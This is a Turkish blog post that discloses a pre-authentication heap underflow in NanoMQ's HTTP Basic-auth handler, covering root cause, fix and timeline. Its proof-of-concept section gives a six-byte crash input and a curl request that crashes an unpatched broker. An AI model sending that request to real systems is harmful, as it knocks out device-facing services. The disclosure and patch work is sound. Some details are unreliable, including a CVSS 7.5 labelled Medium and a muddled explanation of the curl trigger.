---
layout: post
title: "NanoMQ rest_api.c basic_authorize() Heap Buffer Underflow"
date: 2026-11-22
author: Yunus Aydın
lang: tr
description: "NanoMQ rest_api.c basic_authorize() içinde kimlik doğrulaması öncesi heap buffer underflow: 6 byte'lık Authorization header HTTP API'yi çökertiyor."
keywords: "NanoMQ, heap buffer underflow, out-of-bounds write, CWE-787, CWE-191, basic_authorize, rest_api.c, libFuzzer, ASAN, UBSAN, DoS, MQTT broker, güvenlik araştırması"
canonical_url: "https://aydinnyunus.github.io/2026/11/22/nanomq-basic-authorize-heap-underflow-tr/"
---

```bash
$ printf 'Basicc' | ./auth_harness -
# rest_api.c:828:5: runtime error: addition of unsigned offset to 0x... overflowed to 0x...
# SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior rest_api.c:828:5
```

Altı byte. Ne kullanıcı adı var, ne şifre. NanoMQ'nun HTTP API'si daha kimlik bilgisine bakmadan buffer'ın dışına yazıyor. Bunu NanoMQ'nun REST yüzeyini libFuzzer ile fuzzlarken buldum ve **2 Mayıs 2026**'da, o günün son tag'i olan **0.24.13** için maintainer'lara raporladım. Bu bir kimlik doğrulaması öncesi crash: tek bir credential doğrulanmadan önce yazma gerçekleşiyor. Yani tahmin edilecek bir şey yok, bypass edilecek bir şey de yok. Elinde bir socket ve "Basic" kelimesi olsun, yeter.

## Arka plan

NanoMQ, edge tarafında çalışan bir MQTT broker'ı ve broker'ın üstünde bir HTTP yönetim API'si getiriyor. Genelde **8081** portunda, endpoint'ler `/api/v4/` altında. Bu endpoint'lerin bir kısmı HTTP Basic auth arkasında ve auth işini `nanomq/rest_api.c` içindeki küçük bir yardımcı hallediyor: `basic_authorize(http_msg *msg)`. Fonksiyon sırayla üç şey yapıyor: `Authorization` header'ının başındaki `Basic ` önekini atıyor, Base64 payload için buffer ayırıyor, sonra decode sırasında `=` padding'ine yer açmak için buffer'ın son byte'larını sıfırlıyor.

İşte üçüncü adımda patlıyor ve patlama sebebinin credential'la hiçbir ilgisi yok: buffer boyutu token uzunluğundan hesaplanıyor, ama token'ın bu sıfırlama için yeterince uzun olup olmadığını kimse kontrol etmiyor.

## Savunmasız kod

Fonksiyonun fix'ten önceki hali, **824-829** satırları civarı, **0.24.8** tag'inden:

```c
static enum result_code
basic_authorize(http_msg *msg)
{
    // msg->token, ham Authorization header değerini tutuyor
    // "Basic " önekini yerinde at
    sscanf(msg->token, "Basic %s", msg->token);

    size_t token_len = strlen(msg->token);

    size_t   decode_len = token_len * 6 / 8 + 1;
    uint8_t *decode     = nng_alloc(decode_len);

    // Base64 '=' padding'i için yer açma niyeti
    decode[decode_len - 1] = '\0';   // decode_len >= 3 ise sorun yok
    decode[decode_len - 2] = '\0';   // decode_len < 2 ise underflow
    decode[decode_len - 3] = '\0';   // decode_len < 3 ise underflow

    // ... 'decode' içine base64 decode, sonra credential karşılaştırması
}
```

Üç yazmadan önce `token_len` üzerinde hiçbir uzunluk kontrolü yok. `decode_len` en az 3 mü diye bakan da yok. Yazmalar koşulsuz. Bug'ın tamamı bu.

## Kök neden

`decode_len` saldırganın kontrol ettiği bir uzunluktan türüyor, sıfırlama indeksleri de unsigned aritmetikle cevaplanıyor:

1. `sscanf(msg->token, "Basic %s", msg->token)` çağrısı `Basic ` önekinden sonra ne kaldıysa aynı buffer'a bırakıyor, `token_len` de o kalanın uzunluğu oluyor. Tek karakterli bir kalan `token_len = 1` verir, yani `decode_len = 1 * 6 / 8 + 1 = 1`.
2. `decode_len` bir `size_t`. Dolayısıyla `decode_len - 2` ve `decode_len - 3` unsigned uzayda hesaplanıyor. `decode_len = 1` için bu ifadeler negatife düşmüyor; `SIZE_MAX` ve `SIZE_MAX - 1` değerlerine sarıyor.
3. `decode[SIZE_MAX]` ve `decode[SIZE_MAX - 1]`, "buffer'ın biraz öncesi" değil. 64-bit bir makinede adres, adres uzayının tepesinden dolanıp process'in sahip olmadığı düşük belleğe iniyor. Null byte ya anında fault veriyor ya da sanitizer'ın izin verdiği yerleşime göre allocator'ın önemsediği belleği sessizce bozuyor.

Desen, CWE-787 (out-of-bounds write) üstüne oturmuş CWE-191 (integer underflow). İlginç olan ikinci kısım: yazan kişinin kafasında indeks *negatif*, ama pointer aritmetiğine varmadan tip işareti siliyor.

Aritmetik tablo halinde:

```text
token_len | decode_len | decode[decode_len - 2]   | decode[decode_len - 3]
----------|------------|--------------------------|-------------------------
    1     |     1      | SIZE_MAX'e sarıyor       | SIZE_MAX - 1'e sarıyor
    2     |     2      | index 0 (sınırda)        | SIZE_MAX'e sarıyor
    3     |     3      | index 1 (sınırda)        | index 0 (sınırda)
    4+    |     4+     | sınırda                  | sınırda
```

Bir request'ten ulaşılabilen sadece ilk iki satır, temiz underflow da yalnızca ilkinde.

## Proof of concept

Minimal girdi altı byte: `Basic` kelimesi ve bitişik tek karakter, arada boşluk yok. Bu string'i authorization yoluna ver, gerisini fonksiyon hallediyor.

```bash
# "Basic " önekinden sonra tek byte
$ printf 'Basicc' > /tmp/poc-basicc
$ ./auth_harness /tmp/poc-basicc
rest_api.c:828:5: runtime error: addition of unsigned offset to 0x60d000000380 overflowed to 0x60d0000001ff
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior rest_api.c:828:5
```

Ağ üzerinden aynı şey, yönetim API'sine tek bir `curl`:

```bash
# burada "Basic " sonrası token tek karakter, decode_len 1'e düşüyor
curl -s -o /dev/null \
  -H 'Authorization: Basic Yg==' \
  http://<nanomq-host>:8081/api/v4/brokers
```

O request ağ üzerinden `basic_authorize()`'a ulaşıyor ve `Yg==` gerçekten tek karakterin Base64'ü; ama bıraktığı dört karakterli kalan tek başına trigger değil. Bu curl crash'e sadece `sscanf(msg->token, "Basic %s", msg->token)` aynı buffer'ı okuyup yazdığı için çarpıyor, yani parser'ın prefix sonrası gördüğü şey her zaman istemcinin gönderdiği şey değil. Byte-seviyesinde tetikleyici yukarıdaki altı byte'lık `Basicc`; curl'ü minimal reproducer değil, yolun ağdan ulaşılabilir olduğunun kanıtı olarak oku.

Tetikleme şeklinin kredisi fuzzer'a ait. Harness, `rest_api.c`'yi `#include` edip bir dosyayı doğrudan `basic_authorize()`'a veren küçük bir `auth_harness.c` dosyasıydı; clang-14 ile ASAN + UBSAN altında derlendi. Soğuk başlangıçtan **34 execution**'da crash'e ulaştı. Yani bu bug'ın arkasında ne kadar az arama alanı olduğunu bu sayı anlatıyor.

## Etki

- **Denial of service.** HTTP API'ye ulaşabilen kimliksiz bir istemci, tek request'le process'i çökertiyor. Credential yok, zamanlama yok, durum yok.
- **Memory corruption.** Yazılan tek bir null byte, ama heap'in tabanına yakın, glibc'nin `malloc` chunk metadata'sını tuttuğu bir adrese düşüyor.
- **Code execution yok.** Yazılan değer sabit `\0`, allocation kısa ömürlü ve modern glibc (2.29 ve sonrası) metadata kurcalamasını kontrollü bir yazmaya değil abort'a çeviren heap integrity kontrolleri çalıştırıyor. Burada RCE iddia etmiyorum ve kimse de "RCE vardır" varsayımıyla fix yazmasın.

CVSS 3.1 skoru **7.5** (Medium): `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`. Network'ten ulaşılabilir, yetki gerekmiyor, kullanıcı etkileşimi yok, sadece availability. Broker cihazlarının konuştuğu şey olduğunda DoS-only de ciddi bir fatura.

## Düzeltme

NanoMQ fix'i **0.24.14**'te yayınladı, commit [`24cedc08`](https://github.com/nanomq/nanomq/commit/24cedc08a291e7787acd52108b9161c790aed03b) (`* FIX [rest_api] fix a memory corruption bug in basic authorization API`). Üç şey yapıyor ve yukarıda anlattığım aritmetik sadece ilki:

```c
enum result_code result = SUCCEED;

// 1. sscanf tamamen gitti, "Basic " ile başlamayan her şey reddediliyor
if (msg->token_len <= 6 || strncmp(msg->token, "Basic ", 6) != 0) {
    return EMPTY_USERNAME_OR_PASSWORD;
}

char  *b64_token = msg->token + 6;
size_t token_len = strlen(b64_token);

// 2. gerçek credential "user:pass", yani en az 4 Base64 karakter
if (token_len < 4) {
    return WRONG_USERNAME_OR_PASSWORD;
}

size_t   token_alloc_len = token_len + 1;
uint8_t *token           = nng_zalloc(token_alloc_len);
if (token == NULL) {
    return UNKNOWN_MISTAKE;
}
memcpy(token, b64_token, token_len);
// ...
size_t   decode_len = token_len * 6 / 8 + 1;

// 3. buffer allocation anında sıfırlanıyor; elle padding yazmaları yok artık
uint8_t *decode     = nng_zalloc(decode_len);
if (decode == NULL) {
    nng_free(auth, auth_len);
    nng_free(token, token_alloc_len);
    return UNKNOWN_MISTAKE;
}
```

Bug'ı ortadan kaldıran üçüncü değişiklik: `nng_zalloc` zaten sıfırlanmış buffer döndürüyor, dolayısıyla `decode[decode_len - 2]` ve `decode[decode_len - 3]` hesaplayan koşulsuz padding yazmaları hiç yok. İkinci değişiklikteki uzunluk tabanı, ileride biri elle yazma geri getirse bile `decode_len`'in küçük olmasını imkansız kılıyor. Birinci değişiklik de `msg->token` üzerinde aynı buffer'a okuyup yazan `sscanf`'i emekliye ayırıyor; o da başlı başına bir UB'ydi.

Upstream commit'i alamayan bir fork'u yamalıyorsan, en küçük güvenli değişiklik uzunluk tabanının kendisi: gerçek bir credential `user:pass`'tir ve header parse edildikten sonra en az dört Base64 karakter üretir, dolayısıyla daha kısa olan her şey kapıda çöpe atılabilir.

```c
size_t token_len = strlen(msg->token);
if (token_len < 4) {
    return WRONG_USERNAME_OR_PASSWORD;
}
```

Upstream fix daha ileri gidiyor ve bu fazladan adımlar kopyalanmaya değer: girdiyi decode etmek yerine reddetmek, buffer'ı `sscanf`'e yeniden yazdırmak yerine prefix'i açıkça yönetmek, ve hesaplanmış offset'te elle sıfırlamak yerine sıfırlamayı allocator'a bırakmak.

## Bu pattern neden tekrar tekrar çıkıyor

Bu bug'ın altındaki alışkanlık şu: kodu yazan kişi, girdinin Base64 bir credential olduğunu *biliyor* ama bunu hiç kanıtlamıyor. Header'dan bir decode uzunluğu hesaplıyor, o kadar byte ayırıyor, sonra sonda sabit offset üç byte yazıyor; çünkü yazarken kafasında geçerli bir token vardı. Fuzzer'ın kafasında geçerli bir token yok. Saldırganın kafasında da.

Aynı üç satırda daha sessiz ikinci bir varsayım var: bir uzunluktan çıkarmanın güvenli olduğu, çünkü uzunluğun bir sayı olduğu. C'de uzunluk unsigned bir sayıdır ve uzunluğu 1 olan bir değerde `len - 2`, eksi bir değil `SIZE_MAX`'tir. Bu satırı ben de yazdım. C string işleriyle bir öğleden sonra geçiren hemen herkes yazmıştır. Bu yüzden burada review'dan çok derleyici bayrağı konuşuyor: UBSAN bu hatayı 34 execution'da yakaladı, halbuki aynı üç satırı gözle okumak bir reviewer'ın kolayca geçiştirdiği türden bir şey, çünkü niyet ("padding'i temizle") bariz, sınır ise ("ya padding yoksa") değil. Elinde bir parser varsa CI'da `-fsanitize=address,undefined` açıp entry point'e fuzzer salmak, bir kez daha dikkatli okumaktan daha ucuz. Klasik OWASP out-of-bounds write ailesinin (CWE-787) bir kuzeni bu; üstündeki underflow maskesi (CWE-191) de indeksin masum görünmesini sağlayan numara.

## Etkilenen yüzey

**0.24.13** ve öncesinde, HTTP yönetim API'sinin ulaşılabilir olduğu her kurulumda mevcut. NanoMQ'nun varsayılan `nanomq.conf`'unda REST server'ı 8081'de açarsan bu böyle. Fix **0.24.14**'te geldi; yani sürüm numaran 0.24.13 ya da altına sıralanıyorsa savunmasız koddasın ve 8081'in hiç cevap verip vermediğini görmek için brokers endpoint'ine bir curl yeter.

## Raporlama zaman çizelgesi

- **2 Mayıs 2026**: underflow'u libFuzzer + ASAN/UBSAN ile buldum (34 execution) ve reproducer'la sanitizer trace'ini NanoMQ maintainer'larına raporladım.
- **20 Mayıs 2026**: Maintainer JaylinYu `basic_authorize`'ı [`24cedc08`](https://github.com/nanomq/nanomq/commit/24cedc08a291e7787acd52108b9161c790aed03b) commit'inde düzeltti, 0.24.14'te yayınlandı.
- **22 Kasım 2026**: bu yazıyı yayınladım.

## Referanslar

- [CWE-787: Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html)
- [CWE-191: Integer Underflow (Wrap or Wraparound)](https://cwe.mitre.org/data/definitions/191.html)
- [NanoMQ repository](https://github.com/nanomq/nanomq)
- [GitHub Security Advisory GHSA-cgxg-fqq7-hqf9](https://github.com/nanomq/nanomq/security/advisories/GHSA-cgxg-fqq7-hqf9)
- [Fix commit 24cedc08](https://github.com/nanomq/nanomq/commit/24cedc08a291e7787acd52108b9161c790aed03b)
- [NanoMQ 0.24.14 release](https://github.com/nanomq/nanomq/releases/tag/0.24.14)
- [NanoMQ HTTP API dokümantasyonu](https://nanomq.io/docs/en/latest/rest-api.html)

## İlgili içerik

- [CVE'siz güvenlik fix'lerini bulmak: changelog ve commit pipeline](/2026/04/11/finding-security-fixes-without-cve-changelog-analyzer-tr/)
- [CPython http.server ve wsgiref'te CRLF injection](/2026/04/24/crlf-injection-cpython-http-server-wsgiref-tr/)
